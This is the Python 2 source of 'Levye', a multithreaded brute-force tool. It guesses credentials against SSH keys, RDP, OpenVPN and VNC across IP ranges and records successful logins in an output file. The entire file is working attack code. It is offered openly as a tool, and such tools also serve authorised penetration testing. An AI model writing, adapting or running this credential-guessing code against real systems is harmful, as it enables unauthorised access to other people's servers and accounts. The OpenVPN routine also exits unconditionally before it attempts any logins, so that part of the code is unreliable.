__VERSION__ = '0.1'
__AUTHOR__ = 'Galkan'
__DATE__ = '16.07.2014'


try:
	import os
	import re
	import sys
	import shlex
	import signal
	import paramiko
	import argparse
	import tempfile
	import datetime	
	import subprocess
	from lib.threadpool import ThreadPool
	from lib.iprange import IpRange
except ImportError,e:
        import sys
        sys.stdout.write("%s\n" %e)
        sys.exit(1)



class AddressAction(argparse.Action):
  
        def __call__(self, parser, args, values, option = None):

		if args.brute == "sshkey":
			if args.key_file is None:
				print >> sys.stderr, "Please specify key file for sshkey brute force"
				sys.exit(1)
			elif args.username is None:
				print >> sys.stderr, "Please specify Username/Username File"
				sys.exit(1)                	
		elif args.brute == "openvpn": 
			if args.config is None:
				print >> sys.stderr, "Please specify Configuration File"
				sys.exit(1)                		
			elif args.passwd is None:
				print >> sys.stderr, "Please specify Passwd/Passwd File"
				sys.exit(1)
			elif args.username is None:
				print >> sys.stderr, "Please specify Username/Username File"
				sys.exit(1)
		elif args.brute == "rdp":	
			if args.passwd is None:
				print >> sys.stderr, "Please specify Passwd File"
				sys.exit(1)                		
		elif args.brute == "vnckey":
			if args.passwd is None:
				print >> sys.stderr, "Please specify Passwd File"
				sys.exit(1)                		
			
			

class Main:
		
	def __init__(self):
		
		self.services = {"sshkey":self.sshkey,"rdp":self.rdp, "openvpn":self.openvpn, "vnckey":self.vnckey}
		self.levye_readme = "https://github.com/galkan/levye/blob/master/README.md"

		self.openvpn_path = "/usr/sbin/openvpn"		
		self.vpn_failure = re.compile("SIGTERM\[soft,auth-failure\] received, process exiting")
		self.vpn_success = re.compile("Initialization Sequence Completed")
		self.vpn_remote_regex = re.compile("remote\s[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\s[0-9]{1,3}")
		self.vpn_warning = "Warning !!! Both \"remote\" options were used at the same time. But command line \"remote\" options will be used !!!"

		self.xfreerdp_path = "/usr/bin/xfreerdp"
		self.rdp_success = "Authentication only, exit status 0"
		self.rdp_display_error = "Please check that the \$DISPLAY environment variable is properly set."	
		
		self.vncviewer_path = "/usr/bin/vncviewer"
		self.vnc_success = "Authentication successful"
	
		description = "Levye is a brute force tool which is support sshkey, vnckey, rdp, openvpn."
                usage = "Usage: use --help for futher information"
                parser = argparse.ArgumentParser(description = description, usage = usage)
                parser.add_argument('-b', '--brute', dest = 'brute', help = 'Brute Force Type', choices = self.services.keys(), required = True)
		parser.add_argument('-s', '--server', dest = 'server', action = 'store', help = 'Server/Server File', required = True)                
		parser.add_argument('-u', '--user', dest = 'username', action = 'store', help = 'Username/Username File')		
		parser.add_argument('-n', '--number', dest = 'thread', action = 'store', help = 'Thread Number', default = 5, type = int)		
		parser.add_argument('-l', '--log', dest = 'log_file', action = 'store', help = 'Log File', metavar = 'FILE', default = "levye.log")				
                parser.add_argument('-o', '--output', dest = 'output', action = 'store', help = 'Output File', metavar = 'FILE', default = "levye.out")		
		parser.add_argument('-c', '--passwd', dest = 'passwd', action = 'store', help = 'Password/Password File', metavar = 'FILE')
		parser.add_argument('-t', '--timeout', dest = 'timeout', action = 'store', help = 'Timeout Value', default = 2, type = int)
		parser.add_argument('-p', '--port', dest = 'port', action = 'store', help = 'Service Port Number', type = int)		
		parser.add_argument('-k', '--key', dest = 'key_file', action = 'store', help = 'Key File')
		parser.add_argument('-m', '--config', dest = 'config', action = 'store', help = 'Configuration File')

		parser.add_argument('options', nargs='*', action = AddressAction)

		try:
                	self.args = parser.parse_args()
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)	
	

		for levye_file in self.args.log_file, self.args.output:
			if not os.path.exists(levye_file):
				open(levye_file, 'w').close()	
		
		self.ip_list = []
		try:
			iprange = IpRange()
			for ip in iprange.iprange(self.args.server):
				self.ip_list.append(ip)
		except:
			print >> sys.stderr, "Please use IP/CIDR notation. <192.168.37.37/32, 192.168.1.0/24>"
			sys.exit(1)


		now = datetime.datetime.now()
		start_time = "START TIME: " + now.strftime("%Y-%m-%d %H:%M:%S") + "\n"
		print start_time[:-1]
		
		self.fd_log_file = open(self.args.log_file, "a")
		self.fd_output_file = open(self.args.output, "a")

		self.fd_log_file.write(start_time)
		


	def signal_handler(self, signal, frame):

        	print('Bye ...')
        	sys.exit(37)	


	def vnclogin(self, ip, port, passwd_file):	

		print ip, port, passwd_file
		vnc_cmd = "%s -passwd %s %s:%s"% (self.vncviewer_path, passwd_file, ip, port)
		proc = subprocess.Popen(shlex.split(vnc_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)		

		brute =  "LOG: VNC: " + ip + ":" + str(port) + ":" + passwd_file  + "\n"
		self.fd_log_file.write(brute)
		for line in iter(proc.stderr.readline, ''):
			if re.search(self.vnc_success, line):
				now = datetime.datetime.now()
				os.kill(proc.pid, signal.SIGQUIT)
				result = "SUCCESS," + now.strftime("%Y-%m-%d %H:%M:%S") + "," + "VNC," + ip + "," + str(port) + "," + passwd_file + "\n"
				print result[:-1]
				self.fd_output_file.write(result)				
				break


	def vnckey(self, *options):
		
		port = 5900
		
		if not os.path.exists(self.vncviewer_path):
			print >> sys.stderr, "vncviewer: %s path doesn't exists on the system !!!"% (self.vncviewer_path)
			sys.exit(1)

		if self.args.port is not None:
			port = self.args.port
				
		
		if not os.path.isfile(self.args.passwd):
			print >> sys.stderr, "Password must be file !!!"
			sys.exit(1) 				

		try:	
			pool = ThreadPool(int(self.args.thread))
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)

		
		for ip in self.ip_list:
			pool.add_task(self.vnclogin, ip, port, self.args.passwd)
					
		pool.wait_completion()



	def rdplogin(self, ip, user, password, port):
		
		rdp_cmd = "%s /sec:nla /p:%s /u:%s /port:%s /v:%s +auth-only /cert-ignore"% (self.xfreerdp_path, password, user, port, ip)
		proc = subprocess.Popen(shlex.split(rdp_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)		

		brute =  "LOG: RDP: " + ip + ":" + user + ":" + password + ":" + str(port) + "\n"
		self.fd_log_file.write(brute)
		for line in iter(proc.stderr.readline, ''):
			if re.search(self.rdp_success, line):
				now = datetime.datetime.now()
				result = "SUCCESS," + now.strftime("%Y-%m-%d %H:%M:%S") + "," + "RDP," + ip + "," + user + "," + password + "," + str(port) + "\n"
				print result[:-1]
				self.fd_output_file.write(result)				
				break
			elif re.search(self.rdp_display_error, line):
				print >> sys.stderr, "Please check \$DISPLAY is properly set. See readme %s"% self.levye_readme
				break		
		

	def rdp(self):
		
		port = 3389

		if not os.path.exists(self.xfreerdp_path):
			print >> sys.stderr, "xfreerdp: %s path doesn't exists on the system !!!"% (self.xfreerdp_path)
			sys.exit(1)

		if self.args.port is not None:
			port = self.args.port
		
		
		try:	
			pool = ThreadPool(int(self.args.thread))
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)


		for ip in self.ip_list:
			if os.path.isfile(self.args.username):
				for user in open(self.args.username, "r").read().splitlines():
					if os.path.isfile(self.args.passwd):			
						for password in open(self.args.passwd, "r").read().splitlines():
							pool.add_task(self.rdplogin, ip, user, password, port)
					else:
						pool.add_task(self.rdplogin, ip, user, self.args.passwd, port)
			else:
				if os.path.isfile(self.args.passwd):
					for password in open(self.args.passwd, "r").read().splitlines():
						pool.add_task(self.rdplogin, ip, self.args.username, password, port)
				else:
					pool.add_task(self.rdplogin, ip, self.args.username, self.args.passwd, port)

		pool.wait_completion()		
			


	def openvpnlogin(self, host, username, password, brute_file):

		openvpn_cmd = "%s --config %s --auth-user-pass %s --remote %s %s"% (self.openvpn_path, self.args.config, brute_file, host, self.args.port)
		proc = subprocess.Popen(shlex.split(openvpn_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
		
		brute =  "LOG: OPENVPN: " + host + ":" + username + ":" + password + ":" + brute_file + "\n"
		self.fd_log_file.write(brute)
		for line in iter(proc.stdout.readline, ''):
			if re.search(self.vpn_success, line):
				now = datetime.datetime.now()
				result = "SUCCESS," + now.strftime("%Y-%m-%d %H:%M:%S") + "," + "OPENVPN," + host + "," + username + "," + password + "," + brute_file + "\n"
				print result[:-1]
				self.fd_output_file.write(result)				
				os.kill(proc.pid, signal.SIGQUIT)



	def openvpn(self):

		port = 443

		if not os.path.exists(self.openvpn_path):
			print >> sys.stderr, "openvpn: %s path doesn't exists on the system !!!"% (self.openvpn_path)
			sys.exit(1)

		if self.args.port is not None:
			port = self.args.port


		try:	
			pool = ThreadPool(int(self.args.thread))
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)	

		for config_line in open(self.args.config, "r"):
			if re.search(self.vpn_remote_regex, config_line):
				print self.vpn_warning
		sys.exit(1)	

		for ip in self.ip_list:
			if os.path.isfile(self.args.username):
				for user in open(self.args.username, "r").read().splitlines():
					if os.path.isfile(self.args.passwd):			
						for password in open(self.args.passwd, "r").read().splitlines():
							brute_file = tempfile.NamedTemporaryFile(mode='w+t')
							brute_file_name = brute_file.name
							brute_file.write(user + "\n")
							brute_file.write(password + "\n")
							brute_file.seek(0)
							pool.add_task(self.openvpnlogin, ip, user, password, brute_file_name)
					else:
						brute_file = tempfile.NamedTemporaryFile(mode='w+t')
						brute_file_name = brute_file.name
						brute_file.write(user + "\n")
						brute_file.write(self.args.passwd + "\n")
						brute_file.seek(0)
						pool.add_task(self.openvpnlogin, ip, user, self.args.passwd, brute_file_name)
			else:
				if os.path.isfile(self.args.passwd):
					for password in open(self.args.passwd, "r").read().splitlines():
						brute_file = tempfile.NamedTemporaryFile(mode='w+t')
						brute_file_name = brute_file.name
						brute_file.write(self.args.username + "\n")	
						brute_file.write(password + "\n")
						brute_file.seek(0)
						pool.add_task(self.openvpnlogin, ip, self.args.username, password, brute_file_name)
				else:
					brute_file = tempfile.NamedTemporaryFile(mode='w+t')
					brute_file_name = brute_file.name
					brute_file.write(self.args.username + "\n")
					brute_file.write(self.args.passwd + "\n")
					brute_file.seek(0)
					pool.add_task(self.openvpnlogin, ip, self.args.username, self.args.passwd, brute_file_name)
		
		pool.wait_completion()	
		

	
	def sshlogin(self,ip,port,user,keyfile,timeout):	
	
		ssh = paramiko.SSHClient()	
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		
		brute =  "LOG: SSH: " + ip + ":" + str(port) + ":" + user + ":" + keyfile + ":" + str(timeout) + "\n"
		self.fd_log_file.write(brute)
		try:
			ssh.connect(ip, port, username=user, password=None, pkey=None, key_filename=keyfile, timeout=timeout, allow_agent=False, look_for_keys=False)
			now = datetime.datetime.now()
			result = "SUCCESS," + now.strftime("%Y-%m-%d %H:%M:%S") + "," + "SSH," + ip + "," + str(port) + "," + user + "," + keyfile + "\n"
			print result[:-1]
			self.fd_output_file.write(result)
		except Exception ,err:
			pass
			

	def sshkey(self):

		port = 22
				
		if self.args.port is not None:
			port = self.args.port
		
		try:
			pool = ThreadPool(self.args.thread)
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)
	

		for ip in self.ip_list:
			if os.path.isfile(self.args.username):
				for user in open(self.args.username, "r").read().splitlines():
					if os.path.isdir(self.args.key_file):
						for dirname, dirnames, filenames in os.walk(self.args.key_file):
							for keyfile in filenames:
								keyfile_path = self.args.key_file + "/" + keyfile
								pool.add_task(self.sshlogin, ip, port, user, keyfile_path, self.args.timeout)
					else:
						pool.add_task(self.sshlogin, ip, port, user, self.args.key_file, self.args.timeout)
			else:
				if os.path.isdir(self.args.key_file):
					for dirname, dirnames, filenames in os.walk(self.args.key_file):
						for keyfile in filenames:
							keyfile_path = self.args.key_file + "/" + keyfile						
							pool.add_task(self.sshlogin, ip, port, self.args.username, keyfile_path, self.args.timeout)
				else:
					pool.add_task(self.sshlogin, ip, port, self.args.username, self.args.key_file, self.args.timeout)
			
		pool.wait_completion()


	def run(self, brute_type):

		signal.signal(signal.SIGINT, self.signal_handler)

		if not brute_type in self.services.keys():
			print >> sys.stderr, "%s is not valid service. Please select %s "% (brute_type,self.services.keys())
			sys.exit(1)
		else:
			self.services[brute_type]()

			now = datetime.datetime.now()
			stop_time = "STOP TIME: " + now.strftime("%Y-%m-%d %H:%M:%S") + "\n"
			print stop_time[:-1]

			self.fd_log_file.write(stop_time)	

			self.fd_output_file.close()		
			self.fd_log_file.close()
